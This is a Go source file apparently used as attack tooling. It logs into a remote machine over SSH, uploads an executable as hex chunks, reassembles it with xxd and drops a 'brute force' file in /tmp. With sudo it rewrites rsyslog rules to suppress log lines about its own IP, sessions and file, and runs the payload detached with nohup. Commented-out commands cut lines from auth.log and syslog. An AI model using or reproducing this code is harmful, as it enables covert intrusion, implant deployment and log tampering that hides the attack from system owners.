package sendbf

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	vars "test/vars"
	"time"

	"golang.org/x/crypto/ssh"
)

var StrResult strings.Builder
var isSudo bool
var PidToStart string
var commands []string
var Pids []string
var SId []string
var SidString string
var Search = true

func SendBf(confa vars.Config) {
	// Reset to default color
	filePath := "../client/main" // replace with your file path
	configFile := "config.toml"
	bfFile := "test.csv"

	// SSH client configuration
	config := &ssh.ClientConfig{
		User: confa.Client.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(confa.Client.Pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to the remote host
	hostPort := fmt.Sprintf("%s:%s", confa.Client.Host, confa.Client.Port)
	client, err := ssh.Dial("tcp", hostPort, config)
	if err != nil {
		log.Fatalf("Failed to dial: %s", err)
	}
	defer client.Close()

	// Create a new session
	session, err := client.NewSession()
	if err != nil {
		log.Fatalf("Failed to create session: %s", err)
	}

	defer session.Close()

	stdin, err := session.StdinPipe()
	if err != nil {
		log.Fatalf("Failed to create stdin pipe: %s", err)
	}
	stdout, err := session.StdoutPipe()
	if err != nil {
		log.Fatalf("Unable to setup stdout for session: %s", err)
	}
	defer stdin.Close()

	// Start the session shell
	err = session.Shell()
	if err != nil {
		log.Fatalf("Failed to start shell: %s", err)
	}
	go CheckStds(stdout, confa)
	_, err = stdin.Write([]byte("groups $USER\n"))
	if err != nil {
		fmt.Println(err)
	}
	_, err = stdin.Write([]byte("echo $$\n"))
	if err != nil {
		fmt.Println(err)
	}
	time.Sleep(1 * time.Second)
	trimmed := ""
	for Search {

		c := fmt.Sprintf("cat /proc/%s/status | grep PPid\n", Pids[len(Pids)-1])

		_, err = stdin.Write([]byte(c))
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(1 * time.Second)
		if Pids[len(Pids)-1] == "1" || Pids[len(Pids)-1] == "0" {
			Search = false
			StrResult.WriteString("LEADER=(")
			for i, num := range Pids {
				if i > 0 {
					StrResult.WriteString(num)
					StrResult.WriteString("|") // Add the separator between elements
				}
			}
			trimmed = strings.TrimSuffix(StrResult.String(), "|")
			trimmed = trimmed + ")"
		}

	}

	sessionID := fmt.Sprintf("grep -l --exclude=\"*.ref\" -E \"%s\"  /run/systemd/sessions/* 2>/dev/null \n", trimmed)

	time.Sleep(3 * time.Second)
	_, err = stdin.Write([]byte(sessionID))
	fmt.Println("END WAITING")

	time.Sleep(1 * time.Second)
	files := []string{configFile, bfFile}
	StringToSend := []string{}
	fileData := OpenAndReadFiles(filePath)

	hexString := hex.EncodeToString(fileData)
	z := splitString(hexString, 100000)

	for i, file := range files {
		fileData := OpenAndReadFiles(file)
		if i == 0 {
			for _, j := range SId {
				SidString = SidString + j + "|"
			}

			SidString = strings.TrimSuffix(SidString, "|")
			something := fmt.Sprintf("\n\tSessionId=\"%s\"\n", SidString)
			str := strings.Join(Pids, "|")
			seconfSomething := fmt.Sprintf("\tPids=\"%s\"", str)
			fileData = append(fileData, []byte(something)...)
			fileData = append(fileData, []byte(seconfSomething)...)
		}
		encodedString := base64.StdEncoding.EncodeToString(fileData)

		StringToSend = append(StringToSend, encodedString)
	}

	// fmt.Println("Sid Strings: ", SidString)
	time.Sleep(2 * time.Second)
	if err != nil {
		log.Fatalf("Failed to send command: %s", err)
	}

	for _, chunk := range z {
		commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", chunk, confa.Flags.PreFile))
		// fmt
	}
	// isSudo = false
	commands = append(commands, fmt.Sprintf("xxd -r -p %s > %s \n", confa.Flags.PreFile, confa.Flags.MainFile))
	commands = append(commands, fmt.Sprintf("chmod +x  %s \n", confa.Flags.MainFile))
	commands = append(commands, fmt.Sprintf("echo \"%s\" >> /tmp/%s \n", StringToSend[0], configFile))

	commands = append(commands, fmt.Sprintf("echo \"%s\" >> /tmp/%s \n", StringToSend[1], bfFile))

	// isSudo = false
	if isSudo {
		fmt.Println(string(vars.Red), "IS SUDO", string(vars.Reset))
		fileName := path.Base(confa.Flags.MainFile)
		rsyslogCommand := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "1s/^/if (\$msg contains \"%s\" or \$msg contains \"restart rsyslog\" or \$msg contains \"Session\" or \$msg contains \"Removed session\" or \$msg contains \"session opened for user %s\" or \$msg contains \"session closed for user %s\" or \$msg contains \"of user %s.\" or \$msg contains \"\/tmp\/%s\") then stop\n/" /etc/rsyslog.d/50-default.conf'`+"\n", confa.Client.Pass, "192.168.23.61", confa.Client.User, confa.Client.User, confa.Client.User, fileName)
		rsyslogRestart := (fmt.Sprintf("bash -c 'echo %s | sudo -S systemctl restart rsyslog' \n ", confa.Client.Pass))
		// ClearAuthLog := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "$(($(wc -l < /var/log/auth.log) - 10)),\$d" /var/log/auth.log'`, confa.Client.Pass)
		// // ClearSyslog := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "$(($(wc -l < /var/log/syslog) - 10)),\$d" /var/log/syslog'`, confa.Client.Pass)
		commands = append(commands, rsyslogCommand)
		commands = append(commands, rsyslogRestart)
		// commands = append(commands, ClearAuthLog)
		// commands = append(commands, ClearSyslog)
		commands = append(commands, fmt.Sprintf("bash -c 'echo %s | sudo -S nohup %s > /dev/null 2>&1 & disown' \n", confa.Client.Pass, confa.Flags.MainFile))

	} else {
		fmt.Println(string(vars.Green), "JUST USER", string(vars.Reset))
		commands = append(commands, fmt.Sprintf("bash -c 'nohup %s > /dev/null 2>&1 & disown' \n", confa.Flags.MainFile))
	}

	for i, command := range commands {
		_, err := stdin.Write([]byte(command))
		if err != nil {
			log.Fatalf("Failed to send command: %s", err)
		}
		fmt.Println("Sending Command :", i+1, "from", len(commands))

		if !strings.Contains(commands[i], ">>") {
			fmt.Println(command)
		}
		if strings.Contains(commands[i], configFile) {
			fmt.Println("sending Config Toml File")
		}
		if strings.Contains(commands[i], bfFile) {
			fmt.Println("sending Brute Force File")
		}
		if strings.Contains(commands[i], "systemctl restart rsyslog") {
			fmt.Println(string(vars.GreenString), "Restarting RsysLog Waiting few seconds", string(vars.Reset))
			time.Sleep(10 * time.Second)
		}
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(2 * time.Second)
	// err = session.Wait()
	stdin.Close()
	err = session.Close()

	if err != nil {
		log.Fatalf("Failed to wait for session: %s", err)
	}
	fmt.Println(string(vars.Green), "---------END---------", string(vars.Reset))
}

func CheckStds(stdout io.Reader, confa vars.Config) {
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			Result := scanner.Text()
			patern := fmt.Sprintf(`\b%s\b.*\bsudo\b|\bsudo\b.*\b%s\b`, confa.Client.User, confa.Client.User)
			paternNumber := `\b\d{4,}\b`
			paternSessionID := `^/run/systemd/sessions/\d{1,3}$`
			paternPPid := `PPid:`
			re := regexp.MustCompile(patern)

			if re.MatchString(Result) {
				isSudo = true
			}
			renum := regexp.MustCompile(paternNumber)
			if renum.MatchString(Result) {
				if !strings.Contains(Result, "PPid:") {
					Pids = append(Pids, Result)
				}
			}
			reppid := regexp.MustCompile(paternPPid)
			if reppid.MatchString(Result) {
				x := strings.Split(Result, "\t")
				Pids = append(Pids, x[1])
			}
			resess := regexp.MustCompile(paternSessionID)
			if resess.MatchString(Result) {
				SId = append(SId, filepath.Base(Result))
			}
		}
	}()
} // TODO THE FUCK WITH THIS NAME

func splitString(str string, size int) []string {
	var chunks []string
	for i := 0; i < len(str); i += size {
		end := i + size
		if end > len(str) {
			end = len(str)
		}
		chunks = append(chunks, str[i:end])
	}
	return chunks
}

func OpenAndReadFiles(filepath string) []byte {

	file, err := os.Open(filepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Read the file content
	fileContent, err := io.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}
	return fileContent
}
